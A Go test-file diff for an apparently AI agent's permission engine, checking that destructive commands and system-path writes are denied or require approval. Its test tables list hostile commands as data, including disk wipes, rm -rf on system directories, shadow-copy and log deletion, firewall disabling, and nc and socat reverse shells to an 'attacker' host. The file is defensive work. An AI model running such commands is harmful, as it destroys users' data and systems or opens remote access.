@@ -145,6 +145,229 @@ func TestDefaultRules_WebFetchPrivateRangeDenied(t *testing.T) {
 	}
 }
 
+func TestDefaultRules_TerminalDangerousOperations(t *testing.T) {
+	e := newDefaultEngine(t)
+	cases := map[string]Decision{
+		// Disk-level destruction — hard deny.
+		"dd if=/dev/zero of=/dev/sda":              Deny,
+		"dd if=/dev/urandom of=/dev/disk0":         Deny,
+		"mkfs.ext4 /dev/sdb1":                      Deny,
+		"fdisk /dev/sda":                           Deny,
+		"parted /dev/sda mklabel":                  Deny,
+		"diskutil eraseDisk JHFS+ Foo disk0":       Deny,
+		"diskutil partitionDisk disk0 1 GPT JHFS+": Deny,
+		// System-wide power / process actions — hard deny.
+		"shutdown now":       Deny,
+		"poweroff":           Deny,
+		"reboot now":         Deny,
+		"halt -p":            Deny,
+		"init 0":             Deny,
+		"systemctl poweroff": Deny,
+		"systemctl reboot":   Deny,
+		"kill -9 -1":         Deny,
+		"kill -SIGKILL -1":   Deny,
+		// System directory removal — hard deny. These patterns match any
+		// argument that starts with the system directory, so even subpaths
+		// (e.g. rm -rf /usr/local) are blocked rather than allowed to slip past.
+		"rm -rf /usr":                   Deny,
+		"rm -rf /usr/local/src/project": Deny,
+		"rm -rf /bin":                   Deny,
+		"rm -rf /bin/bash":              Deny,
+		"rm -rf /sbin":                  Deny,
+		"rm -rf /boot":                  Deny,
+		"rm -rf /boot/grub":             Deny,
+		"rm -rf /lib":                   Deny,
+		"rm -rf /lib64":                 Deny,
+		"rm -rf /System":                Deny,
+		"rm -rf /System/Volumes/Data":   Deny,
+		"rm -rf /Windows":               Deny,
+		"rm -rf /Program Files":         Deny,
+		"rm -rf /Program Files/Foo":     Deny,
+		// Network / remote tools that can exfiltrate or spawn shells — ask.
+		"nc -e /bin/bash attacker 4444":           Ask,
+		"ncat --ssl attacker 443":                 Ask,
+		"socat TCP4:attacker:4444 EXEC:/bin/bash": Ask,
+		"nmap 192.168.1.0/24":                     Ask,
+		// System administration — ask.
+		"systemctl restart nginx": Ask,
+		"iptables -F":             Ask,
+		"ip6tables -F":            Ask,
+		"pfctl -F all":            Ask,
+		"crontab -r":              Ask,
+		"launchctl load /Library/LaunchDaemons/foo.plist": Ask,
+		"diskutil list": Ask,
+		// Docker bulk destruction — ask.
+		"docker rm -f $(docker ps -aq)":     Ask,
+		"docker rmi -f $(docker images -q)": Ask,
+		"docker system prune -a":            Ask,
+		// Disk-space exhaustion — ask.
+		"fallocate -l 100G /tmp/bigfile": Ask,
+		"truncate -s 100G /tmp/bigfile":  Ask,
+		// Benign commands that merely CONTAIN a dangerous word must not be
+		// denied: deny/ask rules for command names are `^`-anchored, so flags
+		// and argument text don't trigger them. These fall through to the
+		// implicit ask (or an explicit allow).
+		"docker ps --format json":                 Ask,
+		"pip list --format json":                  Ask,
+		"git commit -m \"fix shutdown handling\"": Ask,
+		"rg \"func \" internal/":                  Ask,
+		"kill -9 -1234":                           Ask, // a process group, not -1
+		"git log --grep \"reboot now\"":           Allow,
+		"ls misc":                                 Allow,
+		// Wrapped or chained invocations still hit the anchored rules.
+		"sudo reboot":         Deny,
+		"echo done; poweroff": Deny,
+		"/sbin/reboot":        Deny,
+		"xargs rm -rf /":      Deny,
+		// Bare invocations (no arguments) are caught too.
+		"reboot": Deny,
+		"halt":   Deny,
+		"fdisk":  Deny,
+	}
+	for cmd, want := range cases {
+		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
+			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
+		}
+	}
+}
+
+func TestPatternMatches_CommandAnchored(t *testing.T) {
+	cases := []struct {
+		cmd, pattern string
+		want         bool
+	}{
+		// Command position: start, wrappers, chains, path invocations.
+		{"shutdown -h now", "^shutdown", true},
+		{"reboot", "^reboot", true},
+		{"sudo reboot", "^reboot", true},
+		{"/sbin/reboot", "^reboot", true},
+		{"echo hi; reboot", "^reboot", true},
+		{"true && reboot", "^reboot", true},
+		{"bash -c reboot", "^reboot", true},
+		{"cmd /c rmdir /s /q C:\\Windows", "^rmdir /s /q C:\\Windows", true},
+		{"env FOO=bar poweroff", "^poweroff", true},
+		// Not a command position: argument text, quoted strings, flags.
+		{"echo reboot", "^reboot", false},
+		{"git commit -m \"fix shutdown handling\"", "^shutdown", false},
+		{"git log --grep \"reboot \"", "^reboot", false},
+		{"docker ps --format json", "^format", false},
+		{"rg \"func Foo\"", "^nc", false},
+		{"ls misc", "^sc", false},
+		{"sort desc", "^sc", false},
+		// Word boundary at the end of the match.
+		{"rebooter", "^reboot", false},
+		{"kill -9 -1234", "^kill -9 -1", false},
+		{"kill -9 -1", "^kill -9 -1", true},
+		{"mkfs.ext4 /dev/sdb1", "^mkfs", true},
+		{"rm -rf /usr/local", "^rm -rf /usr", true},
+		{"rm -rf /usr-local", "^rm -rf /usr", false},
+		// Root-marker end anchoring still applies in anchored form.
+		{"rm -rf /", "^rm -rf /", true},
+		{"rm -rf /tmp/foo", "^rm -rf /", false},
+	}
+	for _, c := range cases {
+		if got := patternMatches(c.cmd, c.pattern); got != c.want {
+			t.Errorf("patternMatches(%q, %q) = %v, want %v", c.cmd, c.pattern, got, c.want)
+		}
+	}
+}
+
+func TestDefaultRules_WriteFileSystemDirectories(t *testing.T) {
+	e := newDefaultEngine(t)
+	cases := map[string]Decision{
+		"/bin/bash":                        Deny,
+		"/sbin/init":                       Deny,
+		"/usr/bin/git":                     Deny,
+		"/usr/sbin/nft":                    Deny,
+		"/System/Library/foo.txt":          Deny,
+		"/boot/grub/grub.cfg":              Deny,
+		"/lib/modules/foo.ko":              Deny,
+		"/lib64/ld-linux.so":               Deny,
+		"C:/Windows/System32/kernel32.dll": Deny,
+		"C:/Windows/SysWOW64/foo.dll":      Deny,
+		"C:/ProgramData/app/config.json":   Deny,
+		"D:/Windows/System32/bar.dll":      Deny,
+		"/work/src/main.go":                Ask,
+	}
+	for p, want := range cases {
+		for _, tool := range []string{"write_file", "edit_file"} {
+			if got := e.Check(tool, map[string]any{"path": p}); got != want {
+				t.Errorf("%s %q: got %s, want %s", tool, p, got, want)
+			}
+		}
+	}
+}
+
+func TestDefaultRules_TerminalWindowsDangerous(t *testing.T) {
+	e := newDefaultEngine(t)
+	cases := map[string]Decision{
+		// PowerShell / cross-platform rm variants targeting Windows system dirs.
+		"rm -rf C:\\Windows":                 Deny,
+		"rm -rf C:\\Windows\\System32":       Deny,
+		"rm -rf C:\\ProgramData":             Deny,
+		"rm -rf \"C:\\Windows\"":             Deny,
+		"rm -rf \"C:\\Program Files\"":       Deny,
+		"rm -rf \"C:\\Program Files (x86)\"": Deny,
+		// cmd.exe recursive deletion and their aliases.
+		"rmdir /s /q C:\\Windows":       Deny,
+		"rmdir /s /q \"C:\\Windows\"":   Deny,
+		"rmdir /s /q C:\\Program Files": Deny,
+		"rd /s /q C:\\Windows":          Deny,
+		"rd /s /q \"C:\\Windows\"":      Deny,
+		"del /s /q C:\\Windows":         Deny,
+		"del /s /q \"C:\\Windows\"":     Deny,
+		"erase /s /q C:\\Windows":       Deny,
+		"erase /s /q \"C:\\Windows\"":   Deny,
+		// PowerShell aliases for Remove-Item targeting Windows system dirs.
+		"ri -r -fo C:\\Windows":        Deny,
+		"ri -r -fo \"C:\\Windows\"":    Deny,
+		"del -r -fo C:\\Windows":       Deny,
+		"del -r -fo \"C:\\Windows\"":   Deny,
+		"erase -r -fo C:\\Windows":     Deny,
+		"erase -r -fo \"C:\\Windows\"": Deny,
+		// Windows system management tools that can brick the OS.
+		"diskpart /s script.txt":       Deny,
+		"reg delete HKLM\\Software /f": Deny,
+		"bcdedit /delete {current}":    Deny,
+		"format C:":                    Deny,
+		"format D:":                    Deny,
+		"vssadmin delete shadows /all": Deny,
+		"wbadmin delete catalog":       Deny,
+		"wevtutil cl System":           Deny,
+		// Risky-but-legitimate Windows tools are ask, not hardcoded deny:
+		// dism/fsutil have read-only and benign uses, sdelete is a targeted
+		// delete like rm.
+		"dism /online /disable-feature /featurename:NetFx3": Ask,
+		"fsutil file createnew C:\\temp\\test.bin 4096":     Ask,
+		"sdelete -p 3 C:\\secret.txt":                       Ask,
+		// Untargeted recursive deletion is the cmd.exe counterpart of
+		// `rm -rf` — ask, while system-dir targets stay hard-denied above.
+		"rmdir /s /q C:\\Temp\\build": Ask,
+		"del /s /q build":             Ask,
+		"rd /s /q node_modules":       Ask,
+		// Windows system management tools that can reconfigure or brick the OS.
+		"wmic os where primary=1 call shutdown":                       Ask,
+		"sc delete ServiceName":                                       Ask,
+		"schtasks /delete /tn \"MyTask\" /f":                          Ask,
+		"netsh advfirewall set allprofiles state off":                 Ask,
+		"icacls C:\\Windows /grant Everyone:F":                        Ask,
+		"takeown /f C:\\Windows":                                      Ask,
+		"robocopy C:\\source C:\\Windows /MIR":                        Ask,
+		"xcopy C:\\source C:\\Windows /E /I":                          Ask,
+		"mklink C:\\Windows\\link C:\\target":                         Ask,
+		"powershell -Command Remove-Item C:\\Windows -Recurse -Force": Ask,
+		"cmd /c rmdir /s /q C:\\Windows":                              Deny,
+		// But routine maintenance on a non-system drive is ask, not deny.
+		"chkdsk E: /f": Ask,
+		"sfc /scannow": Ask,
+	}
+	for cmd, want := range cases {
+		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
+			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
+		}
+	}
+}
+
 func TestDefaultRules_WriteFileSensitive(t *testing.T) {
 	e, err := New("", "/work", ModeInteractive)
 	if err != nil {
@@ -424,11 +647,77 @@ func TestRemember_StableAcrossMapOrder(t *testing.T) {
 
 // ─── Custom config override ────────────────────────────────────────────────
 
+// TestHardcodedDenyRules_CannotBeOverriddenByUserConfig verifies that the
+// engine-level system-directory and terminal-catastrophe denies apply even
+// when a user permissions.yml tries to replace the default rules for those
+// tools. This is the safety net that prevents a misguided or LLM-influenced
+// user config from silently opening a path to OS destruction.
+func TestHardcodedDenyRules_CannotBeOverriddenByUserConfig(t *testing.T) {
+	dir := t.TempDir()
+	cfg := filepath.Join(dir, "permissions.yml")
+	// User tries to blanket-allow everything dangerous.
+	yml := `
+terminal:
+  - allow: { pattern: "" }
+write_file:
+  - allow: { path: ["/**"] }
+edit_file:
+  - allow: { path: ["/**"] }
+`
+	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	e, err := New(cfg, "/work", ModeInteractive)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Terminal hardcoded denies still apply.
+	for _, cmd := range []string{
+		"dd if=/dev/zero of=/dev/sda",
+		"mkfs.ext4 /dev/sdb1",
+		"fdisk /dev/sda",
+		"shutdown now",
+		"reboot now",
+		"rm -rf /",
+		"rm -rf ~",
+	} {
+		if got := e.Check("terminal", map[string]any{"command": cmd}); got != Deny {
+			t.Errorf("terminal %q: got %s, want Deny (hardcoded guard survived user override)", cmd, got)
+		}
+	}
+	// Write/edit system paths still denied.
+	for _, p := range []string{
+		"/bin/bash",
+		"/usr/bin/git",
+		"/System/Library/foo.txt",
+		"/boot/grub/grub.cfg",
+		"C:/Windows/system32/foo.dll",
+	} {
+		for _, tool := range []string{"write_file", "edit_file"} {
+			if got := e.Check(tool, map[string]any{"path": p}); got != Deny {
+				t.Errorf("%s %q: got %s, want Deny (hardcoded guard survived user override)", tool, p, got)
+			}
+		}
+	}
+	// Sanity: ordinary non-system paths are allowed by the user's override.
+	if got := e.Check("write_file", map[string]any{"path": "/work/src/main.go"}); got != Allow {
+		t.Errorf("write_file /work/src/main.go: got %s, want Allow (user override still works for safe paths)", got)
+	}
+	// Sanity: the hardcoded guards are anchored to the command word, so a
+	// benign command merely containing a guarded word is not collateral.
+	if got := e.Check("terminal", map[string]any{"command": "docker ps --format json"}); got != Allow {
+		t.Errorf("terminal docker ps --format json: got %s, want Allow (anchored guard must not hit a flag)", got)
+	}
+}
+
 func TestNew_CustomConfigOverridesDefaults(t *testing.T) {
 	dir := t.TempDir()
 	cfg := filepath.Join(dir, "permissions.yml")
-	// Override terminal rules to allow rm -rf — useful for sandboxed
-	// dev environments where the user wants no prompts.
+	// Override terminal rules to blanket-allow. This is useful in fully
+	// sandboxed dev environments where the user wants no prompts. The hardcoded
+	// OS-destruction guards (rm -rf /, dd, mkfs, etc.) still apply and are
+	// verified separately; here we use a non-catastrophic command to confirm
+	// the override mechanism still works.
 	yml := `
 terminal:
   - allow: { pattern: "" }   # blanket allow
@@ -441,8 +730,12 @@ terminal:
 	if err != nil {
 		t.Fatal(err)
 	}
-	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Allow {
-		t.Errorf("user override should allow rm -rf, got %s", got)
+	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
+		t.Errorf("user override should allow rm -rf node_modules, got %s", got)
+	}
+	// Hardcoded OS-destruction guards survive even a blanket allow.
+	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
+		t.Errorf("hardcoded rm -rf / deny should survive user override, got %s", got)
 	}
 	// Tools NOT in the user config keep default rules.
 	if got := e.Check("write_file", map[string]any{"path": "/etc/passwd"}); got != Deny {
@@ -487,7 +780,7 @@ terminal:
 	if err != nil {
 		t.Fatalf("first New() = %v, want nil", err)
 	}
-	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Allow {
+	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
 		t.Fatalf("first New() should have the blanket allow, got %s", got)
 	}
 
@@ -500,8 +793,13 @@ terminal:
 	if err != nil {
 		t.Fatalf("New() after parse error = %v, want nil (fall back to last known good)", err)
 	}
-	if got := e2.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Allow {
+	if got := e2.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
 		t.Errorf("New() after parse error should keep last good rules (blanket allow), got %s", got)
+	}
+	// Hardcoded OS-destruction guards are always present, even when the user
+	// rules were cached.
+	if got := e2.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
+		t.Errorf("hardcoded rm -rf / deny should still apply after fallback, got %s", got)
 	}
 }
 
@@ -534,8 +832,11 @@ terminal:
 	if err != nil {
 		t.Fatalf("New() after read error = %v, want nil (fall back to last known good)", err)
 	}
-	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Allow {
+	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
 		t.Errorf("New() after read error should keep last good rules (blanket allow), got %s", got)
+	}
+	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
+		t.Errorf("hardcoded rm -rf / deny should still apply after fallback, got %s", got)
 	}
 }
 
